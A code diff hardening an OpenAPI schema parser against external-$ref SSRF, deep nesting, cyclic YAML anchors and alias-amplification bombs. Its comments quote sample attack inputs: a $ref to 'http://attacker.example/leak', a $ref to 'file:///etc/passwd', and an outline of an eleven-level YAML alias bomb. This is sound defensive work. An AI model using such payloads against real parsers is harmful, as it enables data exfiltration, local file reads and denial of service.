@@ -16,6 +16,40 @@ import { SchemaParser, ParsedSchema, ParsedOperation, ParsedResource } from '../
 const MAX_SCHEMA_BYTES = 100 * 1024 * 1024; // 100 MB
 
 /**
+ * A document's *shape* is bounded separately from its byte size,
+ * because the two come apart.
+ *
+ * YAML anchors and aliases share references, so js-yaml loads
+ *
+ *     a:  &a  ["x", ... 9 of them ...]
+ *     l0: &l0 [*a, *a, ... 9 of them ...]
+ *     ... eleven levels ...
+ *
+ * in under a millisecond from 356 bytes — the object graph really is
+ * tiny. But the document it *denotes* has 9^12 nodes, and anything that
+ * walks it as a tree (this file's `$ref` sweep did, and JSON.stringify
+ * on the way to the database does) runs for geological time. Bull's job
+ * `timeout` cannot save us: the walk is synchronous, so it blocks the
+ * event loop of the process that also serves the API.
+ *
+ * The cap is expressed against the source length rather than as a flat
+ * number, because that is exactly the property being defended: an
+ * honest document cannot denote materially more nodes than it has
+ * characters to describe them with (the cheapest JSON node is a couple
+ * of bytes). Anything past that ratio is alias amplification. The floor
+ * keeps small, oddly-shaped-but-legitimate documents out of it.
+ */
+const MIN_EXPANDED_NODES = 100_000;
+
+/**
+ * Structural nesting limit. Note this is now enforced by *throwing* —
+ * the previous guard `return`ed past its limit, so a `$ref` buried
+ * below it was never inspected at all: a security sweep that failed
+ * open at exactly the depth an attacker controls.
+ */
+const MAX_SCHEMA_DEPTH = 1000;
+
+/**
  * Parser options that disable EXTERNAL $ref resolution. Without this,
  * SwaggerParser.dereference() happily follows `$ref: "http://..."` or
  * `$ref: "file:///etc/passwd"` — a classic SSRF + local-file-read
@@ -67,7 +101,7 @@ export class OpenAPIParserService implements SchemaParser {
       // before. The components.schemas pool stays in `originalSchema`
       // metadata for resource extraction but isn't cloned per op.
       const api = schemaObject as OpenAPIV3.Document;
-      this.assertNoExternalRefs(api);
+      this.assertSafeDocument(api, rawSchema);
 
       // Snapshot the small bits we want to surface in the result
       // BEFORE we start tearing down `api`. Once these are captured
@@ -118,22 +152,78 @@ export class OpenAPIParserService implements SchemaParser {
   }
 
   /**
-   * Reject any $ref that targets an external URL or local file. Internal
-   * JSON-Pointer refs (`#/components/...`) are kept and resolved lazily.
-   * Without this guard a user-supplied schema could exfiltrate data via
-   * `$ref: "http://attacker.example/leak"` or read local files.
+   * One sweep of the loaded document that establishes everything the
+   * rest of the parser assumes about its shape.
+   *
+   *   - no `$ref` targets an external URL or a local file. Internal
+   *     JSON-Pointer refs (`#/components/...`) are kept and resolved
+   *     lazily; without this guard a user-supplied schema could
+   *     exfiltrate via `$ref: "http://attacker.example/leak"` or read
+   *     local files;
+   *   - nesting stays under `MAX_SCHEMA_DEPTH`, and going over it
+   *     THROWS. The previous version returned instead, which meant a
+   *     `$ref` buried 1001 levels down was never looked at — the check
+   *     failed open at exactly the depth the attacker chooses;
+   *   - the document does not *denote* vastly more nodes than it spends
+   *     characters describing. See `MIN_EXPANDED_NODES`.
+   *
+   * The walk is memoised on node identity, so a document that shares
+   * subtrees (every YAML alias does, and so does an honest spec that
+   * anchors a common parameter block) costs one visit per distinct
+   * node rather than one per path reaching it. That memo is the whole
+   * defence: the old tree walk visited 11.4 million nodes for a 356-byte
+   * input, and each extra alias level multiplied it by the fan-out.
+   *
+   * A node encountered while it is still on the current path is a cycle
+   * — js-yaml builds those from recursive anchors (`a: &a {b: *a}`) and
+   * they have no finite expansion, so they are refused outright. They
+   * would also make `JSON.stringify` throw further downstream, where
+   * the failure is far less legible.
    */
-  private assertNoExternalRefs(node: any, depth = 0): void {
-    if (!node || typeof node !== 'object' || depth > 1000) return;
-    if (typeof node.$ref === 'string') {
-      const ref = node.$ref;
-      if (!ref.startsWith('#/')) {
-        throw new Error(`External $ref blocked: ${ref}`);
+  private assertSafeDocument(root: any, rawSchema: unknown): void {
+    const maxNodes = Math.max(
+      MIN_EXPANDED_NODES,
+      typeof rawSchema === 'string' ? rawSchema.length : 0,
+    );
+    const expandedSize = new Map<object, number>();
+    const onPath = new Set<object>();
+
+    const visit = (node: any, depth: number): number => {
+      if (!node || typeof node !== 'object') return 1;
+
+      if (depth > MAX_SCHEMA_DEPTH) {
+        throw new Error(
+          `Schema nesting exceeds the ${MAX_SCHEMA_DEPTH}-level limit`,
+        );
       }
-    }
-    for (const v of Array.isArray(node) ? node : Object.values(node)) {
-      this.assertNoExternalRefs(v, depth + 1);
-    }
+      if (onPath.has(node)) {
+        throw new Error('Schema contains a cyclic YAML anchor/alias');
+      }
+
+      const memo = expandedSize.get(node);
+      if (memo !== undefined) return memo;
+
+      if (typeof node.$ref === 'string' && !node.$ref.startsWith('#/')) {
+        throw new Error(`External $ref blocked: ${node.$ref}`);
+      }
+
+      onPath.add(node);
+      let size = 1;
+      for (const child of Array.isArray(node) ? node : Object.values(node)) {
+        size += visit(child, depth + 1);
+        if (size > maxNodes) {
+          throw new Error(
+            `Schema expands to more than ${maxNodes} nodes — ` +
+              'refusing an anchor/alias bomb',
+          );
+        }
+      }
+      onPath.delete(node);
+      expandedSize.set(node, size);
+      return size;
+    };
+
+    visit(root, 0);
   }
 
   async validateSchema(schema: string): Promise<{ isValid: boolean; errors: string[] }> {
